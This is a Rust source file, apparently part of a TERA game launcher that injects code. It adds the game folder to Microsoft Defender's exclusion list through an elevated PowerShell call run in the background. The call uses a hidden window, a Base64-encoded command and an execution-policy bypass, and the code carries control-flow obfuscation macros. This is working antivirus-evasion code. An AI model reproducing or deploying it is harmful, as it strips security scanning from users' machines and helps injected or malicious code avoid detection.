use std::process::Command;
use crate::global_credentials::GLOBAL_CREDENTIALS;
#[cfg(windows)]
use std::os::windows::process::CommandExt;

/// Attempts to add the specified directory to Microsoft Defender's exclusion list.
///
/// Strategy:
/// Perform an elevated PowerShell call via Start-Process -Verb RunAs to add the exclusion.
/// Any failure is logged and a minimal warning is shown, but injection continues.
fn ensure_defender_exclusion(dir: &std::path::Path) -> Result<(), Box<dyn std::error::Error>> {
    cryptify::flow_stmt!();
    // Use the provided directory (binaries folder) as-is to avoid introducing \\?\ prefixes
    let mut dir_str = dir
        .to_str()
        .ok_or("Invalid game directory path for Defender exclusion")?
        .to_string();
    // Explicitly strip any leading \\?\ if present
    if let Some(stripped) = dir_str.strip_prefix(r"\\?\") {
        dir_str = stripped.to_string();
    }

    // Elevated attempt only: create a temp script and run it as admin
    // Create a small temp script to avoid complex quoting for the elevated call
    let script_path = {
        let mut p = std::env::temp_dir();
        p.push("tera_add_defender_excl.ps1");
        p
    };

    let script_content = r#"param([string]$Path)
try {
  $p = [IO.Path]::GetFullPath($Path)
  $mp = Get-MpPreference
  if ($mp.ExclusionPath -notcontains $p) { Add-MpPreference -ExclusionPath $p }
  exit 0
} catch {
  exit 1
}
"#;

    // Write/overwrite the script atomically
    std::fs::write(&script_path, script_content)?;

    // Elevated attempt via Start-Process -Verb RunAs with EncodedCommand to avoid any splitting issues
    // Build the inner command as: & '<script>' -Path '<dir>' and encode it to Base64 (UTF-16LE) within PowerShell
    let script_ps = script_path
        .to_string_lossy()
        .replace("'", "''");
    let dir_ps = dir_str.replace("'", "''");
    let elevated_cmd = format!(
        "$cmd = \"& '{}' -Path '{}'\"; $bytes = [Text.Encoding]::Unicode.GetBytes($cmd); $b64 = [Convert]::ToBase64String($bytes); Start-Process PowerShell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-EncodedCommand',$b64) -Wait",
        script_ps,
        dir_ps
    );

    let status2 = Command::new("powershell.exe")
        .args(&[
            "-NoProfile",
            "-NonInteractive",
            "-WindowStyle",
            "Hidden",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            &elevated_cmd,
        ])
        .creation_flags(0x08000000) 
        .status();

    // Best-effort cleanup of the temporary script
    let _ = std::fs::remove_file(&script_path);

    match status2 {
        Ok(s) if s.success() => Ok(()),
        Ok(s) => Err(format!("Elevated Defender exclusion attempt failed with status: {:?}", s).into()),
        Err(e) => Err(format!("Failed to invoke elevated PowerShell for Defender exclusion: {}", e).into()),
    }
}


/// Trim whitespace and remove a single pair of surrounding quotes from a path string.
fn clean_path_str(s: &str) -> String {
    let t = s.trim();
    if (t.starts_with('"') && t.ends_with('"')) || (t.starts_with('\'') && t.ends_with('\'')) {
        t[1..t.len() - 1].to_string()
    } else {
        t.to_string()
    }
}


/// Public helper to ensure Defender exclusion for the game's directory prior to launching the game.
pub fn ensure_av_exclusion_before_launch() {
    cryptify::flow_stmt!();
    let game_dir = {
        let game_path_str = clean_path_str(&GLOBAL_CREDENTIALS.get_game_path());
        let p = std::path::PathBuf::from(game_path_str);
        p.parent().map(|pp| pp.to_path_buf()).unwrap_or_else(|| {
            let mut exe_dir = std::env::current_exe().unwrap_or_else(|_| std::env::temp_dir());
            exe_dir.pop();
            exe_dir
        })
    };
    let dir_for_thread = game_dir.clone();
    std::thread::spawn(move || {
        let _ = ensure_defender_exclusion(&dir_for_thread);
    });
}
